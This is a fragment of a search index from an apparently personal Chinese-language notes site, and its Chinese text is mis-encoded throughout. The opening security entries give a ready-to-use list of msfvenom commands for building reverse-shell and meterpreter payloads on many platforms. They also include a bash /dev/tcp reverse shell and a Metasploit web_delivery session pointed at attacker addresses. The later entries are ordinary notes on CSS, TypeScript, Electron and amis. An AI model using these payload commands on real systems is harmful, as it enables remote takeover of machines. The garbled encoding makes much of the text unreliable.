7777 exploit lhost è‡ªå·±æœºå™¨çš„ip è¯¦æƒ…è§: ../msf/index","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-msfconsole.html","loc":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-msfconsole.html"},{"title":"MSFç”Ÿæˆå„ç§Payload","text":"Windows msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST = æ”»å‡»æœºIP LPORT = æ”»å‡»æœºç«¯å£ -e x86/shikata_ga_nai -b '\\x00\\x0a\\xff' -i 3 -f exe -o payload.exe Linux msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST = æ”»å‡»æœºIP LPORT = æ”»å‡»æœºç«¯å£ -f elf -o payload.elf MAC OS msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST = æ”»å‡»æœºIP LPORT = æ”»å‡»æœºç«¯å£ -f macho -o payload.macho Android msfvenom -a x86 --platform Android -p android/meterpreter/reverse_tcp LHOST = æ”»å‡»æœºIP LPORT = æ”»å‡»æœºç«¯å£ -f apk -o payload.apk PowerShell msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST = æ”»å‡»æœºIP LPORT = æ”»å‡»æœºç«¯å£ -e cmd/powershell_base64 -i 3 -f raw -o payload.ps1 PHP msfvenom -p php/meterpreter_reverse_tcp LHOST = <Your IP Address> LPORT = <Your Port to Connect On> -f raw > shell.php cat shell.php | pbcopy && echo '<?php ' | tr -d '\\n' > shell.php && pbpaste >>shell.php ASP.net msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST = æ”»å‡»æœºIP LPORT = æ”»å‡»æœºç«¯å£ -f aspx -o payload.aspx JSP msfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST = æ”»å‡»æœºIP LPORT = æ”»å‡»æœºç«¯å£ -f raw -o payload.jsp War msfvenom -p java/jsp_shell_reverse_tcp LHOST = æ”»å‡»æœºIP LPORT = æ”»å‡»æœºç«¯å£ -f raw -o payload.war Node.js msfvenom -p nodejs/shell_reverse_tcp LHOST = æ”»å‡»æœºIP LPORT = æ”»å‡»æœºç«¯å£ -f raw -o payload.js Python msfvenom -p python/meterpreter/reverse_tcp LHOST = æ”»å‡»æœºIP LPORT = æ”»å‡»æœºç«¯å£ -f raw -o payload.py # msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.179.129 LPORT=58765 -f raw -o payload.py Perl msfvenom -p cmd/unix/reverse_perl LHOST = æ”»å‡»æœºIP LPORT = æ”»å‡»æœºç«¯å£ -f raw -o payload.pl Ruby msfvenom -p ruby/shell_reverse_tcp LHOST = æ”»å‡»æœºIP LPORT = æ”»å‡»æœºç«¯å£ -f raw -o payload.rb Lua msfvenom -p cmd/unix/reverse_lua LHOST = æ”»å‡»æœºIP LPORT = æ”»å‡»æœºç«¯å£ -f raw -o payload.lua Windows ShellCode msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST = æ”»å‡»æœºIP LPORT = æ”»å‡»æœºç«¯å£ -f c linux shellcode msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST = æ”»å‡»æœºIP LPORT = æ”»å‡»æœºç«¯å£ -f c mac shellcode msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST = æ”»å‡»æœºIP LPORT = æ”»å‡»æœºç«¯å£ -f c Bash shellcode [ root@localhost ~ ] # msfvenom -p cmd/unix/reverse_bash LHOST=192.168.1.30 LPORT=8888 > -f raw > payload.sh [ root@localhost ~ ] # exec 5<>/dev/tcp/xx.xx.xx.xx/xx [ root@localhost ~ ] # cat <&5 | while read lineÍ¾ do $line 2>&5 >&5Í¾ done Python shellcode msf5 > use exploit/multi/script/web_delivery msf5 exploit ( multi/script/web_delivery ) > set payload python/meterpreter/reverse_tcp msf5 exploit ( multi/script/web_delivery ) > set srvhost 192 .168.179.129 srvhost = > 192 .168.1.30 msf5 exploit ( multi/script/web_delivery ) > set lhost 192 .168.179.129 lhost = > 192 .168.1.30 msf5 exploit ( multi/script/web_delivery ) > set lport 58765 msf5 exploit ( multi/script/web_delivery ) > set uripath lyshark uripath = > lyshark msf5 exploit ( multi/script/web_delivery ) > exploit -j -z","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-kali-MSF-MSF-generates-various-payload.html","loc":"/yq-doc-source-docs-Safety-kali-MSF-MSF-generates-various-payload.html"},{"title":"msfvenom","text":"ç”Ÿæˆ payload æ³¨è§£ venom (æ¯’æ¶²) å¯å‚è€ƒ ../msf/MSFç”Ÿæˆå„ç§Payload","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-kali-MSF-msfvenom.html","loc":"/yq-doc-source-docs-Safety-kali-MSF-msfvenom.html"},{"title":"é—®é¢˜","text":"","tags":"æ–‡æ¡£","url":"/yq-doc-source-docs-document-question-index.html","loc":"/yq-doc-source-docs-document-question-index.html"},{"title":"CSSä¼ªç±»","text":"å¸¸è§çš„ :active å…ƒç´ æ¿€æ´». æ¯”å¦‚æŒ‰é’®è¢«ç‚¹å‡», inputé€‰ä¸­ :hover é¼ æ ‡ç§»å…¥å…ƒç´ . æˆ–è€…è¯´å½“é¼ æ ‡æ‚¬åœåœ¨å…ƒç´ ä¸Šæ—¶åº”ç”¨çš„æ ·å¼ :before åœ¨å…ƒç´ æ¸²æŸ“ä¹‹å‰å¢åŠ å†…å®¹ :after åœ¨å…ƒç´ æ¸²æŸ“ä¹‹åå¢åŠ å†…å®¹ :focus å½“å…ƒç´ è·å¾—ç„¦ç‚¹ï¼ˆä¾‹å¦‚é€šè¿‡é”®ç›˜å¯¼èˆªï¼‰æ—¶åº”ç”¨çš„æ ·å¼ã€‚ :visited è¡¨ç¤ºå·²è®¿é—®è¿‡çš„é“¾æ¥çš„æ ·å¼ã€‚ :link è¡¨ç¤ºæœªè®¿é—®çš„é“¾æ¥çš„æ ·å¼ã€‚ :first-child é€‰æ‹©ä½œä¸ºå…¶çˆ¶å…ƒç´ çš„ç¬¬ä¸€ä¸ªå­å…ƒç´ çš„å…ƒç´ ã€‚ :last-child é€‰æ‹©ä½œä¸ºå…¶çˆ¶å…ƒç´ çš„æœ€åä¸€ä¸ªå­å…ƒç´ çš„å…ƒç´ ã€‚ :nth-child(n) é€‰æ‹©ä½œä¸ºå…¶çˆ¶å…ƒç´ çš„ç¬¬ n ä¸ªå­å…ƒç´ çš„å…ƒç´ ã€‚å…¶ä¸­ n å¯ä»¥æ˜¯ä¸€ä¸ªå…·ä½“çš„æ•°å­—ã€å…³é”®å­—ï¼ˆå¦‚ evenã€oddï¼‰æˆ–è¡¨è¾¾å¼ï¼ˆå¦‚ 2n+1ï¼‰ã€‚ :nth-of-type(n) é€‰æ‹©ä½œä¸ºå…¶çˆ¶å…ƒç´ ä¸­ç‰¹å®šç±»å‹çš„ç¬¬ n ä¸ªå­å…ƒç´ çš„å…ƒç´ ã€‚ :nth-last-child(n) é€‰æ‹©ä½œä¸ºå…¶çˆ¶å…ƒç´ çš„å€’æ•°ç¬¬ n ä¸ªå­å…ƒç´ çš„å…ƒç´ ã€‚ :nth-last-of-type(n) é€‰æ‹©ä½œä¸ºå…¶çˆ¶å…ƒç´ ä¸­ç‰¹å®šç±»å‹çš„å€’æ•°ç¬¬ n ä¸ªå­å…ƒç´ çš„å…ƒç´ ã€‚ :disabled åŒ¹é…è¢«ç¦ç”¨çš„å…ƒç´ ï¼Œä¾‹å¦‚ <input>ã€<button> ç­‰ã€‚å¯ä»¥ç”¨äºæ ·å¼åŒ–ç¦ç”¨çŠ¶æ€ä¸‹çš„å…ƒç´ ã€‚ :enabled åŒ¹é…å¯ç”¨çš„å…ƒç´ ï¼Œä¸ :disabled ç›¸åã€‚å¯ä»¥ç”¨äºæ ·å¼åŒ–å¯ç”¨çŠ¶æ€ä¸‹çš„å…ƒç´ ã€‚ :not() è¡¨ç¤ºå¯¹æŸä¸€ç§é€‰æ‹©å™¨å–å, å¦‚é€‰æ‹©æœªè¢«ç¦ç”¨çš„button: button:not(:disabled) ç°æœ‰cssç±»å±æ€§a,b,c; aä¸‹åŒ…å«bå’Œc, bä¸‹åŒ…å«c å¦‚ä½•å†™cssé€‰æ‹©å™¨, é€‰æ‹© aä¸‹çš„ ä¸å±äºb çš„c: .a .c:not(.b .c)","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-CSS-Pseudo--category.html","loc":"/yq-doc-source-docs-front-end-CSS-Pseudo--category.html"},{"title":"å¼‚å¸¸","text":"åœ¨ TypeScript ä¸­ï¼Œæ²¡æœ‰åƒ Python ä¸­çš„ ValueError è¿™æ ·çš„å†…ç½®å¼‚å¸¸ç±»å‹ã€‚ ä¸è¿‡ï¼Œä½ å¯ä»¥è‡ªå®šä¹‰å¼‚å¸¸ç±»æ¥è¡¨ç¤ºç‰¹å®šçš„é”™è¯¯æƒ…å†µã€‚ ç¤ºä¾‹ï¼Œåœ¨ TypeScript ä¸­è‡ªå®šä¹‰å¼‚å¸¸ç±»: class ValueError extends Error { constructor(message: string) { super(message); this.name = \"ValueError\"; } } function divide(a: number, b: number): number { if (b === 0) { throw new ValueError(\"é™¤æ•°ä¸èƒ½ä¸ºé›¶ï¼\"); } return a / b; } try { const result = divide(10, 0); console.log(result); } catch (error) { if (error instanceof ValueError) { console.error(\"å‘ç”Ÿå€¼é”™è¯¯ï¼š\", error.message); } else { console.error(\"å‘ç”Ÿé”™è¯¯ï¼š\", error.message); } } åœ¨ divide å‡½æ•°ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ throw å…³é”®å­—æŠ›å‡ºä¸€ä¸ª ValueError å¼‚å¸¸ï¼Œæä¾›äº†ç›¸åº”çš„é”™è¯¯æ¶ˆæ¯ã€‚ åœ¨ try å—ä¸­ï¼Œæˆ‘ä»¬è°ƒç”¨ divide å‡½æ•°ï¼Œå¹¶æ ¹æ®å¼‚å¸¸å¯¹è±¡çš„ç±»å‹è¿›è¡Œé€‚å½“çš„å¤„ç†ã€‚ å¦‚æœæ•è·åˆ°çš„å¼‚å¸¸æ˜¯ ValueError ç±»å‹çš„ï¼Œæˆ‘ä»¬æ‰“å°å‡ºå€¼é”™è¯¯çš„æ¶ˆæ¯ï¼Œå¦åˆ™æ‰“å°ä¸€èˆ¬é”™è¯¯çš„æ¶ˆæ¯ã€‚ æ³¨è§£ ä½¿ç”¨ throw æŠ›å‡ºå¼‚å¸¸","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-Conceptual-abnormal.html","loc":"/yq-doc-source-docs-front-end-Conceptual-abnormal.html"},{"title":"electron-builderé…ç½®ç”Ÿæˆä½ç½®","text":"åœ¨ package.json çš„ build ä½ç½®: \"build\": { // electron-builderçš„é…ç½® \"productName\":\"xxxx\", // é¡¹ç›®å è¿™ä¹Ÿæ˜¯ç”Ÿæˆçš„exeæ–‡ä»¶çš„å‰ç¼€å \"appId\": \"com.xxx.xxxxx\", // åŒ…å \"copyright\":\"xxxx\", // ç‰ˆæƒ ä¿¡æ¯ \"directories\": { \"output\": \"build\" // è¾“å‡ºæ–‡ä»¶å¤¹, åªèƒ½é…ç½®è¾“å‡ºçš„ä¸Šé¢å‡ å±‚, // æ¯”å¦‚macä¸‹é»˜è®¤è¾“å‡ºä½ç½®æ˜¯ dist/mac, // åœ¨è¿™é‡Œé…ç½®äº†output ä¸º dist/myapp, // æœ€ç»ˆè¾“å‡ºä½ç½®è¿˜æ˜¯æœ‰mac, ä¼šå˜æˆ dist/myapp/mac // å‘çš„ä¸€æ‰¹ }, // windowsç›¸å…³çš„é…ç½® \"win\": { \"icon\": \"xxx/icon.ico\"// å›¾æ ‡è·¯å¾„ } } éƒ¨åˆ†å‚è€ƒ: https://segmentfault.com/a/1190000017296201","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-Electron-Electron-Builder-configuration.html","loc":"/yq-doc-source-docs-front-end-frame-Electron-Electron-Builder-configuration.html"},{"title":"electronç”Ÿå‘½å‘¨æœŸ","text":"é€€å‡ºçš„ä¸¤ä¸ªè°ƒç”¨: app.quit(): å°è¯•å…³é—­æ‰€æœ‰çª—å£(å¦‚æœçª—å£æœ‰ window.on('close', (e) => e.preventDefault()) åˆ™å¤±è´¥) - é¦–å…ˆå‘å‡º before-quit äº‹ä»¶ï¼Œå¦‚æœæ‰€æœ‰çª—å£å…³é—­æˆåŠŸï¼Œåˆ™å‘å‡º will-quit äº‹ä»¶ï¼Œç„¶å app é€€å‡º - æ­¤æ–¹æ³•ä¼šç¡®ä¿æ‰§è¡Œæ‰€æœ‰çš„ beforeunload å’Œ unloadï¼ˆdomï¼‰äº‹ä»¶ï¼Œå½“ç„¶å¯ä»¥åœ¨ beforeunload äº‹ä»¶ä¸­è¿”å› false é˜»æ­¢ç»§ç»­é€€å‡ºã€‚ app.exit([code]): ä½¿ç”¨ exitCode ç«‹å³é€€å‡ºã€‚exitCode é»˜è®¤ä¸º0 - æ‰€æœ‰çª—å£ç«‹å³å…³é—­ï¼Œè€Œä¸è¯¢é—®ç”¨æˆ·ï¼Œä¸”ä¸è§¦å‘ beforeunload å’Œ unload äº‹ä»¶","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-Electron-Electron-life-cycle.html","loc":"/yq-doc-source-docs-front-end-frame-Electron-Electron-life-cycle.html"},{"title":"webstromä¸­å¦‚ä½•è¿›è¡Œè°ƒè¯•","text":"ä¸»è¦é’ˆå¯¹tsé¡¹ç›® å› ä¸ºtséœ€è¦ç¼–è¯‘æˆjsä½¿ç”¨, æ‰€ä»¥æ–­ç‚¹éœ€è¦æ‰“åœ¨ç¼–è¯‘åçš„jsæ–‡ä»¶å†… å‘½ä»¤è¡Œè§¦å‘æµè§ˆå™¨è°ƒè¯• æœ‰ä¸ª electron æœ‰ä¸ªå†…ç½®çš„å¼€å¯debug, ç›´æ¥å‘½ä»¤è§¦å‘: ./node_modules/.bin/electron . --inspect å…¶ä¸­ --inspect å¯ä»¥è·Ÿç«¯å£(é»˜è®¤9229): --inspect=8888 å¯åŠ¨å, åœ¨ Chrome æµè§ˆå™¨ï¼ˆæˆ–å…¶ä»–åŸºäº Chromium å¼€å‘çš„æµè§ˆå™¨ï¼‰ ä¸­æ‰“å¼€ chrome://inspect å³å¯çœ‹åˆ°å¯¹åº”çš„è°ƒè¯•ä¼šè¯ webstromå¼€å¯è°ƒè¯• å¦‚ä¸‹é…ç½® å…¶ä¸­å‚æ•° out/main.js æ˜¯ç¼–è¯‘å¥½çš„å…¥å£æ–‡ä»¶. æ³¨æ„è§£é‡Šå™¨éœ€è¦é€‰ electron çš„è·¯å¾„ è¿™æ—¶å€™æŠŠæ–­ç‚¹æ‰“åœ¨ç›¸åº”çš„jsæ–‡ä»¶å¹¶ç‚¹å‡»å°è™«å­å³å¯å¼€å¯è°ƒè¯• è‹¥éœ€è¦ç›´æ¥ä¸Šé¢çš„åœ¨æµè§ˆå™¨ä¸­è°ƒè¯•, å¢åŠ å‚æ•°å³å¯: --remote-debugging-port=9222 æ³¨è§£ ç›´æ¥ç‚¹å‡» package.json å¯åŠ¨æ˜¯æ— æ³•è¿›è¡Œè°ƒè¯•çš„.","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-Electron-How-to-debug-in-webstorm.html","loc":"/yq-doc-source-docs-front-end-frame-Electron-How-to-debug-in-webstorm.html"},{"title":"ä¸€äº›é‡åˆ°è¿‡çš„æŠ¥é”™","text":"æŠ¥é”™å†…å®¹: error /Users/yanque/project/webstorm/electron-study/node_modules/electron: Command failed. Exit code: 1 Command: node install.js Arguments: Directory: project/webstorm/electron-study/node_modules/electron Output: ReadError: The server aborted pending request åŸå› : electron ä¸‹è½½ä¸ä¼šä½¿ç”¨æœ¬åœ°é…ç½®çš„ registry é•œåƒ, éœ€è¦é¢å¤–é…ç½® electron_mirror : yarn config set electron_mirror https://npm.taobao.org/mirrors/electron/","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-Electron-Install-error.html","loc":"/yq-doc-source-docs-front-end-frame-Electron-Install-error.html"},{"title":"ä¸€äº›é—®é¢˜","text":"preloadæ— æ³•å¯¼å…¥å…¶ä»–ts BrowserWindowåŠ è½½å‚æ•°webPreferences.preload, å½“preloadè°ƒç”¨äº†nodeçš„apiæ—¶, éœ€è¦å°† nodeIntegration è®¾ç½®ä¸º true: const mainWindow = new BrowserWindow({ width: 800, height: 600, webPreferences: { // é›†æˆnodejs, preloadè„šæœ¬ä¸­ä½¿ç”¨äº†Node.jsçš„APIæ—¶å¿…è®¾ä¸ºtrue, æ‰èƒ½æ­£å¸¸æ‰§è¡Œ nodeIntegration: true, preload: join(__dirname, 'preload.js') } })","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-Electron-some-problems.html","loc":"/yq-doc-source-docs-front-end-frame-Electron-some-problems.html"},{"title":"apié…ç½®-æ•°æ®åŠ è½½/åˆ·æ–°","text":"amisæœ‰æ•°æ®åŸŸçš„æ¦‚å¿µ, æ•°æ®åŸŸä¹Ÿå¯ä»¥ä»apiåŠ è½½. æ™®é€šçš„ ajax è¯·æ±‚ æ ¼å¼: [<method>:]<url> methodï¼šgetã€postã€putã€deleteï¼Œé»˜è®¤ä¸º get urlï¼šæ¥å£åœ°å€ï¼Œå³æ¨¡æ¿å­—ç¬¦ä¸² å¦‚: { \"api\": \"get:/amis/api/initData\", // get è¯·æ±‚ \"api\": \"post:/amis/api/initData\", // post è¯·æ±‚ \"api\": \"put:/amis/api/initData\", // put è¯·æ±‚ \"api\": \"delete:/amis/api/initData\" // delete è¯·æ±‚ } æ³¨æ„æ¥å£è¿”å›æ ¼å¼: { \"status\": 0, \"msg\": \"\", \"data\": { ...å…¶ä»–å­—æ®µ } } status: è¿”å› 0ï¼Œè¡¨ç¤ºå½“å‰æ¥å£æ­£ç¡®è¿”å›ï¼Œå¦åˆ™æŒ‰é”™è¯¯è¯·æ±‚å¤„ç†ï¼› msg: è¿”å›æ¥å£å¤„ç†ä¿¡æ¯ï¼Œä¸»è¦ç”¨äºè¡¨å•æäº¤æˆ–è¯·æ±‚å¤±è´¥æ—¶çš„ toast æ˜¾ç¤ºï¼› data: å¿…é¡»è¿”å›ä¸€ä¸ªå…·æœ‰ key-value ç»“æ„çš„å¯¹è±¡ã€‚ æ³¨è§£ apié»˜è®¤å‘é€å½“å‰æ•°æ®åŸŸçš„æ•°æ®, å¯ä»¥åœ¨å½“å‰å…ƒç´ æ‰‹åŠ¨é…ç½® data æ¥è‡ªå®šä¹‰å‘é€çš„æ•°æ® é¢„åŠ è½½æ•°æ® ä½¿ç”¨ initApi , åŸºæœ¬å¯ç”¨äºæ‰€æœ‰ç»„ä»¶ æ³¨è§£ å®é™…ä½¿ç”¨çš„æ—¶å€™é‡åˆ°ä¸€ä¸ªé—®é¢˜, å†™åœ¨ form çš„ä¸Šä¸€å±‚ dialog ç»„ä»¶, æ²¡æœ‰ç”Ÿæ•ˆ, æ¢åˆ° form ç»„ä»¶, å°±å¯ä»¥äº†, ä¸çŸ¥æ˜¯ä¸ºä½•","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-amis-API-configuration.html","loc":"/yq-doc-source-docs-front-end-frame-amis-API-configuration.html"},{"title":"è¡¨è¾¾å¼è¯­æ³•","text":"JSå¯¹è±¡ä¸å­—ç¬¦ä¸²è½¬æ¢ ENCODEJSON å°†JSå¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸², ä¾‹: data: { envStr: '${ENCODEJSON(envObj)}', }, DECODEJSON å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºJSå¯¹è±¡, ä¾‹: data: { envObj: '${DECODEJSON(envStr)}', },","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-amis-Expression-grammar.html","loc":"/yq-doc-source-docs-front-end-frame-amis-Expression-grammar.html"},{"title":"è¡¨å•æ ¡éªŒ","text":"ç”¨æ³• validations é…ç½®æ ¡éªŒè§„åˆ™, å°½é‡ä½¿ç”¨JSONæ ¼å¼è€Œä¸æ¨èå­—ç¬¦ä¸², å¦‚: { \"type\": \"input-text\", \"label\": \"æ–‡æœ¬\", \"name\": \"text\", \"validations\": { \"isNumeric\": true }, \"description\": \"è¯·è¾“å…¥æ•°å­—ç±»å‹æ–‡æœ¬\" } æ”¯æŒçš„æ ¡éªŒ å‚è€ƒ: https://aisuda.bce.baidu.com/amis/zh-CN/components/form/formitem#è‡ªå®šä¹‰æ ¡éªŒä¿¡æ¯ isNumeric æ˜¯å¦æ˜¯æ•°å­— å®Œæ•´: { isEmail: 'validate.isEmail', isRequired: 'validate.isRequired', isUrl: 'validate.isUrl', isInt: 'validate.isInt', isAlpha: 'validate.isAlpha', isNumeric: 'validate.isNumeric', isAlphanumeric: 'validate.isAlphanumeric', isFloat: 'validate.isFloat', isWords: 'validate.isWords', isUrlPath: 'validate.isUrlPath', matchRegexp: 'validate.matchRegexp', minLength: 'validate.minLength', maxLength: 'validate.maxLength', maximum: 'validate.maximum', lt: 'validate.lt', minimum: 'validate.minimum', gt: 'validate.gt', isJson: 'validate.isJson', isLength: 'validate.isLength', notEmptyString: 'validate.notEmptyString', equalsField: 'validate.equalsField', equals: 'validate.equals', isPhoneNumber: 'validate.isPhoneNumber', isTelNumber: 'validate.isTelNumber', isZipcode: 'validate.isZipcode', isId: 'validate.isId', /* æ—¥æœŸæ—¶é—´ç›¸å…³æ ¡éªŒè§„åˆ™ 2.2.0 åŠä»¥ä¸Šç‰ˆæœ¬ç”Ÿæ•ˆ */ isDateTimeSame: 'validate.isDateTimeSame', isDateTimeBefore: 'validate.isDateTimeBefore', isDateTimeAfter: 'validate.isDateTimeAfter', isDateTimeSameOrBefore: 'validate.isDateTimeSameOrBefore', isDateTimeSameOrAfter: 'validate.isDateTimeSameOrAfter', isDateTimeBetween: 'validate.isDateTimeBetween', isTimeSame: 'validate.isTimeSame', isTimeBefore: 'validate.isTimeBefore', isTimeAfter: 'validate.isTimeAfter', isTimeSameOrBefore: 'validate.isTimeSameOrBefore', isTimeSameOrAfter: 'validate.isTimeSameOrAfter', isTimeBetween: 'validate.isTimeBetween', isVariableName: 'validate.isVariableName' } JSå‡½æ•°è‡ªå®šä¹‰è§„åˆ™ å‚è€ƒ: https://aisuda.bce.baidu.com/amis/zh-CN/docs/extend/addon#æ‰©å±•è¡¨å•éªŒè¯ å®˜ç½‘ç”¨ä¾‹: let amisLib = amisRequire('amis'); amisLib.addRule( // æ ¡éªŒå 'isZXS', // æ ¡éªŒå‡½æ•°ï¼Œvalues æ˜¯è¡¨å•é‡Œæ‰€æœ‰è¡¨å•é¡¹çš„å€¼ï¼Œå¯ç”¨äºåšè”åˆæ ¡éªŒï¼›value æ˜¯å½“å‰è¡¨å•é¡¹çš„å€¼ (values, value) => { if (value === 'æ–°åŠ å¡') { // æ ¡éªŒä¸é€šè¿‡ï¼Œæç¤ºï¼šè¯¥åœ°åŒºä¸åœ¨å›½å†… return { error: true, msg: 'è¯¥åœ°åŒºä¸åœ¨å›½å†…' }; } if ( value === 'åŒ—äº¬' || value === 'ä¸Šæµ·' || value === 'å¤©æ´¥' || value === 'é‡åº†' ) { // return true è¡¨ç¤ºæ ¡éªŒé€šè¿‡ return true; } // æ ¡éªŒä¸é€šè¿‡ï¼Œæç¤ºï¼šè¾“å…¥çš„ä¸æ˜¯ç›´è¾–å¸‚ return { error: true, msg: 'è¾“å…¥çš„ä¸æ˜¯ç›´è¾–å¸‚' }; } ); å…¶ä»–ç›¸å…³é…ç½® è¡¨å•é¡¹å€¼å‘ç”Ÿå˜åŒ–å³æ ¡éªŒ \"validateOnChange\": true","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-amis-Form-verification.html","loc":"/yq-doc-source-docs-front-end-frame-amis-Form-verification.html"},{"title":"amis-æ”¯æŒçš„actonType(äº‹ä»¶åŠ¨ä½œ)","text":"å‚è€ƒ: https://aisuda.bce.baidu.com/amis/zh-CN/docs/concepts/event-action è‡ªå®šä¹‰JS å‚è€ƒ: https://aisuda.bce.baidu.com/amis/zh-CN/docs/concepts/event-action#è‡ªå®šä¹‰-js actionType ä¸º custom script ä¸ºå‡½æ•°æˆ–è€…å‡½æ•°å­—ç¬¦ä¸², å‡½æ•°ç­¾å: script:(context,doAction,event)=>{} contextï¼Œæ¸²æŸ“å™¨ä¸Šä¸‹æ–‡ doAction() åŠ¨ä½œæ‰§è¡Œæ–¹æ³•ï¼Œç”¨äºè°ƒç”¨ä»»ä½• actionType æŒ‡å®šçš„åŠ¨ä½œ eventï¼Œäº‹ä»¶å¯¹è±¡ï¼Œå¯ä»¥è°ƒç”¨ setData()ã€stopPropagation()ã€preventDefault() åˆ†åˆ«å®ç°äº‹ä»¶ä¸Šä¸‹æ–‡è®¾ç½®ã€åŠ¨ä½œå¹²é¢„ã€äº‹ä»¶å¹²é¢„ï¼Œå¯ä»¥é€šè¿‡ event.data è·å–äº‹ä»¶ä¸Šä¸‹æ–‡(åº”è¯¥å«æ•°æ®åŸŸå§) å‚è€ƒ: { \"type\": \"page\", \"body\": [ { \"type\": \"button\", \"label\": \"å‘é€ä¸€ä¸ª http è¯·æ±‚\", \"level\": \"primary\", \"onEvent\": { \"click\": { \"actions\": [ { \"actionType\": \"custom\", \"script\": \"doAction({actionType: 'ajax', args: {api: '/amis/api/mock2/form/saveForm'}});\\n //event.stopPropagation();\" } ] } } } ] } æ³¨è§£ å¯¹äº button çš„ç‚¹å‡»äº‹ä»¶, ç›´æ¥åœ¨å…¶åŒçº§å†™ actionType: \"custom\" æ— æ•ˆ, éœ€è¦å®šä¹‰ onEvent -> click -> actions æ‰è¡Œ(å¦‚ä¸Š). å­˜å‚¨æ•°æ® æœ‰æ—¶åœ¨æ‰§è¡Œè‡ªå®šä¹‰ JS çš„æ—¶å€™ï¼Œå¸Œæœ›è¯¥è¿‡ç¨‹ä¸­äº§ç”Ÿçš„æ•°æ®å¯ä»¥åˆ†äº«ç»™åé¢çš„åŠ¨ä½œä½¿ç”¨ï¼Œ æ­¤æ—¶å¯ä»¥é€šè¿‡ event.setData() æ¥å®ç°äº‹ä»¶ä¸Šä¸‹æ–‡çš„è®¾ç½®ï¼Œè¿™æ ·åé¢åŠ¨ä½œéƒ½å¯ä»¥é€šè¿‡äº‹ä»¶ä¸Šä¸‹æ–‡æ¥è·å–å…±äº«çš„æ•°æ®ã€‚ æ³¨æ„ï¼šç›´æ¥è°ƒç”¨ event.setData() å°†ä¿®æ”¹äº‹ä»¶çš„åŸæœ‰ä¸Šä¸‹æ–‡ï¼Œ å¦‚æœä¸å¸Œæœ›è¦†ç›–å¯ä»¥é€šè¿‡ event.setData({...event.data, ...{xxx: xxx}}) æ¥è¿›è¡Œæ•°æ®çš„åˆå¹¶ã€‚","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-amis-Supported-ActonType.html","loc":"/yq-doc-source-docs-front-end-frame-amis-Supported-ActonType.html"},{"title":"amis","text":"Githubåœ°å€: https://github.com/baidu/amis Amis æ˜¯ç™¾åº¦å¼€æºçš„ä¸€å—å‰ç«¯ä½ä»£ç æ¡†æ¶ï¼Œ é€šè¿‡ JSON é…ç½®å°±èƒ½ç”Ÿæˆå„ç§åå°é¡µé¢ï¼Œæå¤§å‡å°‘å¼€å‘æˆæœ¬ï¼Œç”šè‡³å¯ä»¥ä¸éœ€è¦äº†è§£å‰ç«¯ã€‚ ä½¿ç”¨ åŸæ–‡: https://aisuda.bce.baidu.com/amis/zh-CN/docs/start/getting-started æœ‰ä¸¤ç§æ–¹å¼ åŸç”ŸJSè„šæœ¬å¯¼å…¥(SDKå¯¼å…¥) ç›´æ¥ npm i amis , åœ¨ node_modulesamissdk ç›®å½•é‡Œå°±èƒ½æ‰¾åˆ°; æˆ–è€…ç›´æ¥ä¸‹è½½åŒ…æ–‡ä»¶ https://github.com/baidu/amis/releases/download/3.5.2/sdk.tar.gz , æ‰‹åŠ¨è§£å‹. ç”¨ä¾‹: <script src=\"sdk.js\"></script> <script type=\"text/javascript\"> (function () { let amis = amisRequire('amis/embed'); // é€šè¿‡æ›¿æ¢ä¸‹é¢è¿™ä¸ªé…ç½®æ¥ç”Ÿæˆä¸åŒé¡µé¢ let amisJSON = { type: 'page', title: 'è¡¨å•é¡µé¢', body: { type: 'form', mode: 'horizontal', api: '/saveForm', body: [ { label: 'Name', type: 'input-text', name: 'name' }, { label: 'Email', type: 'input-email', name: 'email' } ] } }; let amisScoped = amis.embed('#root', amisJSON); })(); </script> é»˜è®¤ amis æ¸²æŸ“æ˜¯å•é¡µæ¨¡å¼ å¦‚æœæ˜¯å•é¡µåº”ç”¨ï¼Œåœ¨ç¦»å¼€å½“å‰é¡µé¢çš„æ—¶å€™é€šå¸¸éœ€è¦é”€æ¯å®ä¾‹: amisScoped.unmount(); Reacté¡¹ç›® ç›´æ¥ npm i amis æ•°æ®åŸŸåˆå§‹åŒ– ç›´æ¥ä½¿ç”¨ç¡®å®šçš„æ•°æ® ä½¿ç”¨ data : { \"type\": \"page\", \"data\": { \"name\": \"zhangsan\", \"age\": 20 }, \"body\": [ { \"type\": \"tpl\", \"tpl\": \"my name is ${name}\" } ] } ä»APIè·å–åˆå§‹åŒ–çš„æ•°æ® ä½¿ç”¨ initApi { \"type\": \"page\", \"initApi\": \"/amis/api/initData\", \"body\": \"Hello ${text}\" } æ³¨æ„APIçš„è¿”å›æ•°æ®å¿…å®šæ˜¯è¿™ç§æ ¼å¼: { \"status\": 0, \"msg\": \"\", \"data\": { \"text\": \"World!\" ...å…¶ä»–å­—æ®µ } } 